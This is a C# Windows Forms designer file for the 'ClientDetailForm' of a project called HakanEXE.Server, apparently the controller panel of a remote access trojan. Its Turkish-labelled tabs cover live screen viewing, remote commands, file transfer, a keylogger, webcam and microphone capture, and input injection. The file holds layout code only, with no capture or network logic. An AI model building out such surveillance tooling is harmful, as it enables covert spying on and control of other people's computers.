namespace HakanEXE.Server.Forms
{
    partial class ClientDetailForm
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.tabControlClient = new System.Windows.Forms.TabControl();
            this.tabPageScreen = new System.Windows.Forms.TabPage();
            this.btnStopLiveScreen = new System.Windows.Forms.Button();
            this.btnStartLiveScreen = new System.Windows.Forms.Button();
            this.pbLiveScreen = new System.Windows.Forms.PictureBox();
            this.tabPageCommands = new System.Windows.Forms.TabPage();
            this.btnOpenNotepad = new System.Windows.Forms.Button();
            this.btnRestart = new System.Windows.Forms.Button();
            this.btnShutdown = new System.Windows.Forms.Button();
            this.txtCommandOutput = new System.Windows.Forms.TextBox();
            this.btnExecuteCommand = new System.Windows.Forms.Button();
            this.txtCommandText = new System.Windows.Forms.TextBox();
            this.tabPageFileManager = new System.Windows.Forms.TabPage();
            this.btnRefreshFiles = new System.Windows.Forms.Button();
            this.btnDeleteFile = new System.Windows.Forms.Button();
            this.btnUploadFile = new System.Windows.Forms.Button();
            this.btnDownloadFile = new System.Windows.Forms.Button();
            this.lstFiles = new System.Windows.Forms.ListView();
            this.txtCurrentPath = new System.Windows.Forms.TextBox();
            this.tabPageSystemInfo = new System.Windows.Forms.TabPage();
            this.btnGetSystemInfo = new System.Windows.Forms.Button();
            this.lblSystemInfo = new System.Windows.Forms.Label();
            this.tabPageKeylogger = new System.Windows.Forms.TabPage();
            this.txtKeyloggerOutput = new System.Windows.Forms.TextBox();
            this.btnStopKeylogger = new System.Windows.Forms.Button();
            this.btnStartKeylogger = new System.Windows.Forms.Button();
            this.tabPageMicrophone = new System.Windows.Forms.TabPage();
            this.btnStopMicrophone = new System.Windows.Forms.Button();
            this.btnStartMicrophone = new System.Windows.Forms.Button();
            this.tabPageWebcam = new System.Windows.Forms.TabPage();
            this.pbWebcam = new System.Windows.Forms.PictureBox();
            this.btnStopWebcam = new System.Windows.Forms.Button();
            this.btnStartWebcam = new System.Windows.Forms.Button();
            this.tabPageMouseKeyboard = new System.Windows.Forms.TabPage();
            this.btnSendKeyboardInput = new System.Windows.Forms.Button();
            this.txtKeyboardInput = new System.Windows.Forms.TextBox();
            this.btnMouseClick = new System.Windows.Forms.Button();
            this.tabControlClient.SuspendLayout();
            this.tabPageScreen.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pbLiveScreen)).BeginInit();
            this.tabPageCommands.SuspendLayout();
            this.tabPageFileManager.SuspendLayout();
            this.tabPageSystemInfo.SuspendLayout();
            this.tabPageKeylogger.SuspendLayout();
            this.tabPageMicrophone.SuspendLayout();
            this.tabPageWebcam.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pbWebcam)).BeginInit();
            this.tabPageMouseKeyboard.SuspendLayout();
            this.SuspendLayout();
            // 
            // tabControlClient
            // 
            this.tabControlClient.Controls.Add(this.tabPageScreen);
            this.tabControlClient.Controls.Add(this.tabPageCommands);
            this.tabControlClient.Controls.Add(this.tabPageFileManager);
            this.tabControlClient.Controls.Add(this.tabPageSystemInfo);
            this.tabControlClient.Controls.Add(this.tabPageKeylogger);
            this.tabControlClient.Controls.Add(this.tabPageMicrophone);
            this.tabControlClient.Controls.Add(this.tabPageWebcam);
            this.tabControlClient.Controls.Add(this.tabPageMouseKeyboard);
            this.tabControlClient.Dock = System.Windows.Forms.DockStyle.Fill;
            this.tabControlClient.Location = new System.Drawing.Point(0, 0);
            this.tabControlClient.Name = "tabControlClient";
            this.tabControlClient.SelectedIndex = 0;
            this.tabControlClient.Size = new System.Drawing.Size(942, 603);
            this.tabControlClient.TabIndex = 0;
            this.tabControlClient.SelectedIndexChanged += new System.EventHandler(this.TabControlClient_SelectedIndexChanged);
            // 
            // tabPageScreen
            // 
            this.tabPageScreen.Controls.Add(this.btnStopLiveScreen);
            this.tabPageScreen.Controls.Add(this.btnStartLiveScreen);
            this.tabPageScreen.Controls.Add(this.pbLiveScreen);
            this.tabPageScreen.Location = new System.Drawing.Point(4, 25);
            this.tabPageScreen.Name = "tabPageScreen";
            this.tabPageScreen.Padding = new System.Windows.Forms.Padding(3);
            this.tabPageScreen.Size = new System.Drawing.Size(934, 574);
            this.tabPageScreen.TabIndex = 0;
            this.tabPageScreen.Text = "Ekran";
            this.tabPageScreen.UseVisualStyleBackColor = true;
            // 
            // btnStopLiveScreen
            // 
            this.btnStopLiveScreen.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.btnStopLiveScreen.Location = new System.Drawing.Point(807, 529);
            this.btnStopLiveScreen.Name = "btnStopLiveScreen";
            this.btnStopLiveScreen.Size = new System.Drawing.Size(119, 37);
            this.btnStopLiveScreen.TabIndex = 2;
            this.btnStopLiveScreen.Text = "Akışı Durdur";
            this.btnStopLiveScreen.UseVisualStyleBackColor = true;
            this.btnStopLiveScreen.Click += new System.EventHandler(this.BtnStopLiveScreen_Click);
            // 
            // btnStartLiveScreen
            // 
            this.btnStartLiveScreen.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.btnStartLiveScreen.Location = new System.Drawing.Point(682, 529);
            this.btnStartLiveScreen.Name = "btnStartLiveScreen";
            this.btnStartLiveScreen.Size = new System.Drawing.Size(119, 37);
            this.btnStartLiveScreen.TabIndex = 1;
            this.btnStartLiveScreen.Text = "Akışı Başlat";
            this.btnStartLiveScreen.UseVisualStyleBackColor = true;
            this.btnStartLiveScreen.Click += new System.EventHandler(this.BtnStartLiveScreen_Click);
            // 
            // pbLiveScreen
            // 
            this.pbLiveScreen.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
            | System.Windows.Forms.AnchorStyles.Left)
            | System.Windows.Forms.AnchorStyles.Right)));
            this.pbLiveScreen.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.pbLiveScreen.Location = new System.Drawing.Point(8, 6);
            this.pbLiveScreen.Name = "pbLiveScreen";
            this.pbLiveScreen.Size = new System.Drawing.Size(918, 517);
            this.pbLiveScreen.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pbLiveScreen.TabIndex = 0;
            this.pbLiveScreen.TabStop = false;
            // 
            // tabPageCommands
            // 
            this.tabPageCommands.Controls.Add(this.btnOpenNotepad);
            this.tabPageCommands.Controls.Add(this.btnRestart);
            this.tabPageCommands.Controls.Add(this.btnShutdown);
            this.tabPageCommands.Controls.Add(this.txtCommandOutput);
            this.tabPageCommands.Controls.Add(this.btnExecuteCommand);
            this.tabPageCommands.Controls.Add(this.txtCommandText);
            this.tabPageCommands.Location = new System.Drawing.Point(4, 25);
            this.tabPageCommands.Name = "tabPageCommands";
            this.tabPageCommands.Padding = new System.Windows.Forms.Padding(3);
            this.tabPageCommands.Size = new System.Drawing.Size(934, 574);
            this.tabPageCommands.TabIndex = 1;
            this.tabPageCommands.Text = "Komutlar";
            this.tabPageCommands.UseVisualStyleBackColor = true;
            // 
            // btnOpenNotepad
            // 
            this.btnOpenNotepad.Location = new System.Drawing.Point(267, 7);
            this.btnOpenNotepad.Name = "btnOpenNotepad";
            this.btnOpenNotepad.Size = new System.Drawing.Size(120, 32);
            this.btnOpenNotepad.TabIndex = 5;
            this.btnOpenNotepad.Text = "Not Defteri Aç";
            this.btnOpenNotepad.UseVisualStyleBackColor = true;
            this.btnOpenNotepad.Click += new System.EventHandler(this.BtnOpenNotepad_Click);
            // 
            // btnRestart
            // 
            this.btnRestart.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.btnRestart.Location = new System.Drawing.Point(807, 45);
            this.btnRestart.Name = "btnRestart";
            this.btnRestart.Size = new System.Drawing.Size(119, 39);
            this.btnRestart.TabIndex = 4;
            this.btnRestart.Text = "Yeniden Başlat";
            this.btnRestart.UseVisualStyleBackColor = true;
            this.btnRestart.Click += new System.EventHandler(this.BtnRestart_Click);
            // 
            // btnShutdown
            // 
            this.btnShutdown.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.btnShutdown.Location = new System.Drawing.Point(807, 6);
            this.btnShutdown.Name = "btnShutdown";
            this.btnShutdown.Size = new System.Drawing.Size(119, 39);
            this.btnShutdown.TabIndex = 3;
            this.btnShutdown.Text = "Bilgisayarı Kapat";
            this.btnShutdown.UseVisualStyleBackColor = true;
            this.btnShutdown.Click += new System.EventHandler(this.BtnShutdown_Click);
            // 
            // txtCommandOutput
            // 
            this.txtCommandOutput.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
            | System.Windows.Forms.AnchorStyles.Left)
            | System.Windows.Forms.AnchorStyles.Right)));
            this.txtCommandOutput.BackColor = System.Drawing.SystemColors.InfoText;
            this.txtCommandOutput.Font = new System.Drawing.Font("Consolas", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.txtCommandOutput.ForeColor = System.Drawing.Color.Lime;
            this.txtCommandOutput.Location = new System.Drawing.Point(8, 90);
            this.txtCommandOutput.Multiline = true;
            this.txtCommandOutput.Name = "txtCommandOutput";
            this.txtCommandOutput.ReadOnly = true;
            this.txtCommandOutput.ScrollBars = System.Windows.Forms.ScrollBars.Both;
            this.txtCommandOutput.Size = new System.Drawing.Size(918, 476);
            this.txtCommandOutput.TabIndex = 2;
            // 
            // btnExecuteCommand
            // 
            this.btnExecuteCommand.Location = new System.Drawing.Point(8, 45);
            this.btnExecuteCommand.Name = "btnExecuteCommand";
            this.btnExecuteCommand.Size = new System.Drawing.Size(253, 39);
            this.btnExecuteCommand.TabIndex = 1;
            this.btnExecuteCommand.Text = "Komutu Çalıştır";
            this.btnExecuteCommand.UseVisualStyleBackColor = true;
            this.btnExecuteCommand.Click += new System.EventHandler(this.BtnExecuteCommand_Click);
            // 
            // txtCommandText
            // 
            this.txtCommandText.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left)
            | System.Windows.Forms.AnchorStyles.Right)));
            this.txtCommandText.Location = new System.Drawing.Point(8, 12);
            this.txtCommandText.Name = "txtCommandText";
            this.txtCommandText.Size = new System.Drawing.Size(253, 22);
            this.txtCommandText.TabIndex = 0;
            // 
            // tabPageFileManager
            // 
            this.tabPageFileManager.Controls.Add(this.btnRefreshFiles);
            this.tabPageFileManager.Controls.Add(this.btnDeleteFile);
            this.tabPageFileManager.Controls.Add(this.btnUploadFile);
            this.tabPageFileManager.Controls.Add(this.btnDownloadFile);
            this.tabPageFileManager.Controls.Add(this.lstFiles);
            this.tabPageFileManager.Controls.Add(this.txtCurrentPath);
            this.tabPageFileManager.Location = new System.Drawing.Point(4, 25);
            this.tabPageFileManager.Name = "tabPageFileManager";
            this.tabPageFileManager.Padding = new System.Windows.Forms.Padding(3);
            this.tabPageFileManager.Size = new System.Drawing.Size(934, 574);
            this.tabPageFileManager.TabIndex = 2;
            this.tabPageFileManager.Text = "Dosya Yöneticisi";
            this.tabPageFileManager.UseVisualStyleBackColor = true;
            // 
            // btnRefreshFiles
            // 
            this.btnRefreshFiles.Location = new System.Drawing.Point(463, 6);
            this.btnRefreshFiles.Name = "btnRefreshFiles";
            this.btnRefreshFiles.Size = new System.Drawing.Size(100, 31);
            this.btnRefreshFiles.TabIndex = 5;
            this.btnRefreshFiles.Text = "Yenile";
            this.btnRefreshFiles.UseVisualStyleBackColor = true;
            this.btnRefreshFiles.Click += new System.EventHandler(this.BtnRefreshFiles_Click);
            // 
            // btnDeleteFile
            // 
            this.btnDeleteFile.Location = new System.Drawing.Point(357, 6);
            this.btnDeleteFile.Name = "btnDeleteFile";
            this.btnDeleteFile.Size = new System.Drawing.Size(100, 31);
            this.btnDeleteFile.TabIndex = 4;
            this.btnDeleteFile.Text = "Sil";
            this.btnDeleteFile.UseVisualStyleBackColor = true;
            // 
            // btnUploadFile
            // 
            this.btnUploadFile.Location = new System.Drawing.Point(251, 6);
            this.btnUploadFile.Name = "btnUploadFile";
            this.btnUploadFile.Size = new System.Drawing.Size(100, 31);
            this.btnUploadFile.TabIndex = 3;
            this.btnUploadFile.Text = "Yükle";
            this.btnUploadFile.UseVisualStyleBackColor = true;
            // 
            // btnDownloadFile
            // 
            this.btnDownloadFile.Location = new System.Drawing.Point(145, 6);
            this.btnDownloadFile.Name = "btnDownloadFile";
            this.btnDownloadFile.Size = new System.Drawing.Size(100, 31);
            this.btnDownloadFile.TabIndex = 2;
            this.btnDownloadFile.Text = "İndir";
            this.btnDownloadFile.UseVisualStyleBackColor = true;
            // 
            // lstFiles
            // 
            this.lstFiles.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
            | System.Windows.Forms.AnchorStyles.Left)
            | System.Windows.Forms.AnchorStyles.Right)));
            this.lstFiles.HideSelection = false;
            this.lstFiles.Location = new System.Drawing.Point(8, 43);
            this.lstFiles.Name = "lstFiles";
            this.lstFiles.Size = new System.Drawing.Size(918, 523);
            this.lstFiles.TabIndex = 1;
            this.lstFiles.UseCompatibleStateImageBehavior = false;
            this.lstFiles.View = System.Windows.Forms.View.Details;
            this.lstFiles.DoubleClick += new System.EventHandler(this.LstFiles_DoubleClick);
            // 
            // txtCurrentPath
            // 
            this.txtCurrentPath.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left)
            | System.Windows.Forms.AnchorStyles.Right)));
            this.txtCurrentPath.Location = new System.Drawing.Point(8, 12);
            this.txtCurrentPath.Name = "txtCurrentPath";
            this.txtCurrentPath.Size = new System.Drawing.Size(131, 22);
            this.txtCurrentPath.TabIndex = 0;
            this.txtCurrentPath.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.TxtCurrentPath_KeyPress);
            // 
            // tabPageSystemInfo
            // 
            this.tabPageSystemInfo.Controls.Add(this.btnGetSystemInfo);
            this.tabPageSystemInfo.Controls.Add(this.lblSystemInfo);
            this.tabPageSystemInfo.Location = new System.Drawing.Point(4, 25);
            this.tabPageSystemInfo.Name = "tabPageSystemInfo";
            this.tabPageSystemInfo.Padding = new System.Windows.Forms.Padding(3);
            this.tabPageSystemInfo.Size = new System.Drawing.Size(934, 574);
            this.tabPageSystemInfo.TabIndex = 3;
            this.tabPageSystemInfo.Text = "Sistem Bilgisi";
            this.tabPageSystemInfo.UseVisualStyleBackColor = true;
            // 
            // btnGetSystemInfo
            // 
            this.btnGetSystemInfo.Location = new System.Drawing.Point(8, 6);
            this.btnGetSystemInfo.Name = "btnGetSystemInfo";
            this.btnGetSystemInfo.Size = new System.Drawing.Size(150, 35);
            this.btnGetSystemInfo.TabIndex = 1;
            this.btnGetSystemInfo.Text = "Bilgiyi Getir";
            this.btnGetSystemInfo.UseVisualStyleBackColor = true;
            this.btnGetSystemInfo.Click += new System.EventHandler(this.BtnGetSystemInfo_Click);
            // 
            // lblSystemInfo
            // 
            this.lblSystemInfo.AutoSize = true;
            this.lblSystemInfo.Location = new System.Drawing.Point(8, 55);
            this.lblSystemInfo.Name = "lblSystemInfo";
            this.lblSystemInfo.Size = new System.Drawing.Size(149, 16);
            this.lblSystemInfo.TabIndex = 0;
            this.lblSystemInfo.Text = "Sistem bilgileri burada...";
            // 
            // tabPageKeylogger
            // 
            this.tabPageKeylogger.Controls.Add(this.txtKeyloggerOutput);
            this.tabPageKeylogger.Controls.Add(this.btnStopKeylogger);
            this.tabPageKeylogger.Controls.Add(this.btnStartKeylogger);
            this.tabPageKeylogger.Location = new System.Drawing.Point(4, 25);
            this.tabPageKeylogger.Name = "tabPageKeylogger";
            this.tabPageKeylogger.Padding = new System.Windows.Forms.Padding(3);
            this.tabPageKeylogger.Size = new System.Drawing.Size(934, 574);
            this.tabPageKeylogger.TabIndex = 4;
            this.tabPageKeylogger.Text = "Keylogger";
            this.tabPageKeylogger.UseVisualStyleBackColor = true;
            // 
            // txtKeyloggerOutput
            // 
            this.txtKeyloggerOutput.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
            | System.Windows.Forms.AnchorStyles.Left)
            | System.Windows.Forms.AnchorStyles.Right)));
            this.txtKeyloggerOutput.BackColor = System.Drawing.SystemColors.InfoText;
            this.txtKeyloggerOutput.ForeColor = System.Drawing.Color.Lime;
            this.txtKeyloggerOutput.Location = new System.Drawing.Point(8, 55);
            this.txtKeyloggerOutput.Multiline = true;
            this.txtKeyloggerOutput.Name = "txtKeyloggerOutput";
            this.txtKeyloggerOutput.ReadOnly = true;
            this.txtKeyloggerOutput.ScrollBars = System.Windows.Forms.ScrollBars.Both;
            this.txtKeyloggerOutput.Size = new System.Drawing.Size(918, 511);
            this.txtKeyloggerOutput.TabIndex = 2;
            // 
            // btnStopKeylogger
            // 
            this.btnStopKeylogger.Location = new System.Drawing.Point(145, 6);
            this.btnStopKeylogger.Name = "btnStopKeylogger";
            this.btnStopKeylogger.Size = new System.Drawing.Size(131, 38);
            this.btnStopKeylogger.TabIndex = 1;
            this.btnStopKeylogger.Text = "Durdur";
            this.btnStopKeylogger.UseVisualStyleBackColor = true;
            this.btnStopKeylogger.Click += new System.EventHandler(this.BtnStopKeylogger_Click);
            // 
            // btnStartKeylogger
            // 
            this.btnStartKeylogger.Location = new System.Drawing.Point(8, 6);
            this.btnStartKeylogger.Name = "btnStartKeylogger";
            this.btnStartKeylogger.Size = new System.Drawing.Size(131, 38);
            this.btnStartKeylogger.TabIndex = 0;
            this.btnStartKeylogger.Text = "Başlat";
            this.btnStartKeylogger.UseVisualStyleBackColor = true;
            this.btnStartKeylogger.Click += new System.EventHandler(this.BtnStartKeylogger_Click);
            // 
            // tabPageMicrophone
            // 
            this.tabPageMicrophone.Controls.Add(this.btnStopMicrophone);
            this.tabPageMicrophone.Controls.Add(this.btnStartMicrophone);
            this.tabPageMicrophone.Location = new System.Drawing.Point(4, 25);
            this.tabPageMicrophone.Name = "tabPageMicrophone";
            this.tabPageMicrophone.Padding = new System.Windows.Forms.Padding(3);
            this.tabPageMicrophone.Size = new System.Drawing.Size(934, 574);
            this.tabPageMicrophone.TabIndex = 5;
            this.tabPageMicrophone.Text = "Mikrofon";
            this.tabPageMicrophone.UseVisualStyleBackColor = true;
            // 
            // btnStopMicrophone
            // 
            this.btnStopMicrophone.Location = new System.Drawing.Point(135, 6);
            this.btnStopMicrophone.Name = "btnStopMicrophone";
            this.btnStopMicrophone.Size = new System.Drawing.Size(121, 36);
            this.btnStopMicrophone.TabIndex = 1;
            this.btnStopMicrophone.Text = "Durdur";
            this.btnStopMicrophone.UseVisualStyleBackColor = true;
            this.btnStopMicrophone.Click += new System.EventHandler(this.BtnStopMicrophone_Click);
            // 
            // btnStartMicrophone
            // 
            this.btnStartMicrophone.Location = new System.Drawing.Point(8, 6);
            this.btnStartMicrophone.Name = "btnStartMicrophone";
            this.btnStartMicrophone.Size = new System.Drawing.Size(121, 36);
            this.btnStartMicrophone.TabIndex = 0;
            this.btnStartMicrophone.Text = "Başlat";
            this.btnStartMicrophone.UseVisualStyleBackColor = true;
            this.btnStartMicrophone.Click += new System.EventHandler(this.BtnStartMicrophone_Click);
            // 
            // tabPageWebcam
            // 
            this.tabPageWebcam.Controls.Add(this.pbWebcam);
            this.tabPageWebcam.Controls.Add(this.btnStopWebcam);
            this.tabPageWebcam.Controls.Add(this.btnStartWebcam);
            this.tabPageWebcam.Location = new System.Drawing.Point(4, 25);
            this.tabPageWebcam.Name = "tabPageWebcam";
            this.tabPageWebcam.Padding = new System.Windows.Forms.Padding(3);
            this.tabPageWebcam.Size = new System.Drawing.Size(934, 574);
            this.tabPageWebcam.TabIndex = 6;
            this.tabPageWebcam.Text = "Webcam";
            this.tabPageWebcam.UseVisualStyleBackColor = true;
            // 
            // pbWebcam
            // 
            this.pbWebcam.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
            | System.Windows.Forms.AnchorStyles.Left)
            | System.Windows.Forms.AnchorStyles.Right)));
            this.pbWebcam.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.pbWebcam.Location = new System.Drawing.Point(8, 48);
            this.pbWebcam.Name = "pbWebcam";
            this.pbWebcam.Size = new System.Drawing.Size(918, 518);
            this.pbWebcam.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pbWebcam.TabIndex = 2;
            this.pbWebcam.TabStop = false;
            // 
            // btnStopWebcam
            // 
            this.btnStopWebcam.Location = new System.Drawing.Point(135, 6);
            this.btnStopWebcam.Name = "btnStopWebcam";
            this.btnStopWebcam.Size = new System.Drawing.Size(121, 36);
            this.btnStopWebcam.TabIndex = 1;
            this.btnStopWebcam.Text = "Durdur";
            this.btnStopWebcam.UseVisualStyleBackColor = true;
            this.btnStopWebcam.Click += new System.EventHandler(this.BtnStopWebcam_Click);
            // 
            // btnStartWebcam
            // 
            this.btnStartWebcam.Location = new System.Drawing.Point(8, 6);
            this.btnStartWebcam.Name = "btnStartWebcam";
            this.btnStartWebcam.Size = new System.Drawing.Size(121, 36);
            this.btnStartWebcam.TabIndex = 0;
            this.btnStartWebcam.Text = "Başlat";
            this.btnStartWebcam.UseVisualStyleBackColor = true;
            this.btnStartWebcam.Click += new System.EventHandler(this.BtnStartWebcam_Click);
            // 
            // tabPageMouseKeyboard
            // 
            this.tabPageMouseKeyboard.Controls.Add(this.btnSendKeyboardInput);
            this.tabPageMouseKeyboard.Controls.Add(this.txtKeyboardInput);
            this.tabPageMouseKeyboard.Controls.Add(this.btnMouseClick);
            this.tabPageMouseKeyboard.Location = new System.Drawing.Point(4, 25);
            this.tabPageMouseKeyboard.Name = "tabPageMouseKeyboard";
            this.tabPageMouseKeyboard.Padding = new System.Windows.Forms.Padding(3);
            this.tabPageMouseKeyboard.Size = new System.Drawing.Size(934, 574);
            this.tabPageMouseKeyboard.TabIndex = 7;
            this.tabPageMouseKeyboard.Text = "Fare/Klavye";
            this.tabPageMouseKeyboard.UseVisualStyleBackColor = true;
            // 
            // btnSendKeyboardInput
            // 
            this.btnSendKeyboardInput.Location = new System.Drawing.Point(8, 48);
            this.btnSendKeyboardInput.Name = "btnSendKeyboardInput";
            this.btnSendKeyboardInput.Size = new System.Drawing.Size(200, 36);
            this.btnSendKeyboardInput.TabIndex = 2;
            this.btnSendKeyboardInput.Text = "Klavye Girişi Gönder";
            this.btnSendKeyboardInput.UseVisualStyleBackColor = true;
            this.btnSendKeyboardInput.Click += new System.EventHandler(this.BtnSendKeyboardInput_Click);
            // 
            // txtKeyboardInput
            // 
            this.txtKeyboardInput.Location = new System.Drawing.Point(8, 20);
            this.txtKeyboardInput.Name = "txtKeyboardInput";
            this.txtKeyboardInput.Size = new System.Drawing.Size(200, 22);
            this.txtKeyboardInput.TabIndex = 1;
            // 
            // btnMouseClick
            // 
            this.btnMouseClick.Location = new System.Drawing.Point(214, 20);
            this.btnMouseClick.Name = "btnMouseClick";
            this.btnMouseClick.Size = new System.Drawing.Size(121, 36);
            this.btnMouseClick.TabIndex = 0;
            this.btnMouseClick.Text = "Fare Tıklaması";
            this.btnMouseClick.UseVisualStyleBackColor = true;
            this.btnMouseClick.Click += new System.EventHandler(this.BtnMouseClick_Click);
            // 
            // ClientDetailForm
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 16F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(942, 603);
            this.Controls.Add(this.tabControlClient);
            this.MinimumSize = new System.Drawing.Size(960, 650);
            this.Name = "ClientDetailForm";
            this.Text = "ClientDetailForm";
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.ClientDetailForm_FormClosing);
            this.tabControlClient.ResumeLayout(false);
            this.tabPageScreen.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pbLiveScreen)).EndInit();
            this.tabPageCommands.ResumeLayout(false);
            this.tabPageCommands.PerformLayout();
            this.tabPageFileManager.ResumeLayout(false);
            this.tabPageFileManager.PerformLayout();
            this.tabPageSystemInfo.ResumeLayout(false);
            this.tabPageSystemInfo.PerformLayout();
            this.tabPageKeylogger.ResumeLayout(false);
            this.tabPageKeylogger.PerformLayout();
            this.tabPageMicrophone.ResumeLayout(false);
            this.tabPageWebcam.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pbWebcam)).EndInit();
            this.tabPageMouseKeyboard.ResumeLayout(false);
            this.tabPageMouseKeyboard.PerformLayout();
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.TabControl tabControlClient;
        private System.Windows.Forms.TabPage tabPageScreen;
        private System.Windows.Forms.TabPage tabPageCommands;
        private System.Windows.Forms.PictureBox pbLiveScreen;
        private System.Windows.Forms.Button btnStopLiveScreen;
        private System.Windows.Forms.Button btnStartLiveScreen;
        private System.Windows.Forms.TextBox txtCommandOutput;
        private System.Windows.Forms.Button btnExecuteCommand;
        private System.Windows.Forms.TextBox txtCommandText;
        private System.Windows.Forms.Button btnRestart;
        private System.Windows.Forms.Button btnShutdown;
        private System.Windows.Forms.Button btnOpenNotepad;
        private System.Windows.Forms.TabPage tabPageFileManager;
        private System.Windows.Forms.ListView lstFiles;
        private System.Windows.Forms.TextBox txtCurrentPath;
        private System.Windows.Forms.Button btnRefreshFiles;
        private System.Windows.Forms.Button btnDeleteFile;
        private System.Windows.Forms.Button btnUploadFile;
        private System.Windows.Forms.Button btnDownloadFile;
        private System.Windows.Forms.TabPage tabPageSystemInfo;
        private System.Windows.Forms.Label lblSystemInfo;
        private System.Windows.Forms.Button btnGetSystemInfo;
        private System.Windows.Forms.TabPage tabPageKeylogger;
        private System.Windows.Forms.TextBox txtKeyloggerOutput;
        private System.Windows.Forms.Button btnStopKeylogger;
        private System.Windows.Forms.Button btnStartKeylogger;
        private System.Windows.Forms.TabPage tabPageMicrophone;
        private System.Windows.Forms.Button btnStopMicrophone;
        private System.Windows.Forms.Button btnStartMicrophone;
        private System.Windows.Forms.TabPage tabPageWebcam;
        private System.Windows.Forms.PictureBox pbWebcam;
        private System.Windows.Forms.Button btnStopWebcam;
        private System.Windows.Forms.Button btnStartWebcam;
        private System.Windows.Forms.TabPage tabPageMouseKeyboard;
        private System.Windows.Forms.Button btnSendKeyboardInput;
        private System.Windows.Forms.TextBox txtKeyboardInput;
        private System.Windows.Forms.Button btnMouseClick;
    }
}